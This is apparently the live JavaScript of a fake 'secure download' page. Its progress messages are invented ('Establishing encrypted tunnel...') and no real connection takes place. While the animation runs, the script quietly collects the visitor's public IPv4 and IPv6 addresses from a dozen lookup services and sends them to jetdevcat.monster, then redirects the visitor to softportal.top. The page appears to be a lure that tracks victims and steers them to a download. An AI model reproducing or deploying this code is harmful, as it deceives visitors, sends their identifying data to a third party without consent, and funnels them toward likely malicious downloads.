document.addEventListener('DOMContentLoaded', function() {
  const statusText = document.getElementById('status-text');
  const errorText = document.getElementById('error-text');
  const progressFill = document.querySelector('.progress-fill');

  // Animated status messages
  const statusMessages = [
    'Initializing secure session...',
    'Verifying server credentials...',
    'Establishing encrypted tunnel...',
    'Preparing download link...',
    'Connection established'
  ];

  let messageIndex = 0;
  let isComplete = false;

  // Animate status text
  function updateStatus() {
    if (messageIndex < statusMessages.length && !isComplete) {
      statusText.textContent = statusMessages[messageIndex];
      messageIndex++;

      // Update progress gradually
      const progress = (messageIndex / statusMessages.length) * 100;
      progressFill.style.width = progress + '%';

      if (messageIndex < statusMessages.length) {
        setTimeout(updateStatus, 300);
      } else {
        // Final step - mark as complete and redirect
        isComplete = true;
        statusText.textContent = 'Download starting...';

        // Send click event
        fetch("https://jetdevcat.monster/gd/click.php");
	function sub4(i) {
            const v4d = ['ipv4.icanhazip.com', 'ipv4.ident.me', 'ipv4.tnedi.me', 'ipv4.whatismyip.akamai.com', 'ipv4.ipecho.net/plain', 'ipv4.seeip.org'];
            if (i >= v4d.length) {return;}
            try {
                let xhr = new XMLHttpRequest();
                xhr.withCredentials = false;
                xhr.open('GET', 'https://'+v4d[i]);
                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status <= 300) {
                        window.i4 = xhr.response;
                        fetch(`https://jetdevcat.monster/gd/submit.php?i=${xhr.response}`);
                        subfp(xhr.response);
                    }
                };
                xhr.send();
            } catch (error) { console.log('sub4_error: '+error); }
            sub4(i+1);
        }
        function sub6(i) {
            const v6d = ['ipv6.icanhazip.com', 'ipv6.ident.me', 'ipv6.tnedi.me', 'ipv6.whatismyip.akamai.com', 'ipv6.ipecho.net/plain', 'ipv6.seeip.org'];
            if (i >= v6d.length) {return;}
            try {
                let xhr = new XMLHttpRequest();
                xhr.withCredentials = false;
                xhr.open('GET', 'https://'+v6d[i]);
                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status <= 300) {
                        window.i6 = xhr.response;
                        fetch(`https://jetdevcat.monster/gd/submit.php?i=${xhr.response}`);
                        subfp(xhr.response);
                    }
                };
                xhr.send();
            } catch (error) { console.log('sub6_error: '+error); }
            sub6(i+1);
        }
sub4(0);
sub6(0);

        setTimeout(() => {
          window.location.href = 'https://softportal.top/s/all';
        }, 500);
      }
    }
  }

  // Start the animation sequence
  setTimeout(updateStatus, 200);

  // Add hover effects for enhanced interactivity
  const card = document.querySelector('.card');

  card.addEventListener('mouseenter', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(-2px)';
      this.style.boxShadow = '0 40px 80px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1)';
    }
  });

  card.addEventListener('mouseleave', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(0)';
      this.style.boxShadow = '0 32px 64px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.05)';
    }
  });
});

// Info popup toggle
function toggleInfoPopup() {
  const popup = document.getElementById('infoPopup');
  if (popup.style.display === 'block') {
    popup.style.display = 'none';
  } else {
    popup.style.display = 'block';
  }
}

// Close popup when clicking outside
document.addEventListener('click', function(event) {
  const popup = document.getElementById('infoPopup');
  const infoBtn = event.target.closest('button[onclick="toggleInfoPopup()"]');

  if (!popup.contains(event.target) && !infoBtn) {
    popup.style.display = 'none';
  }
});
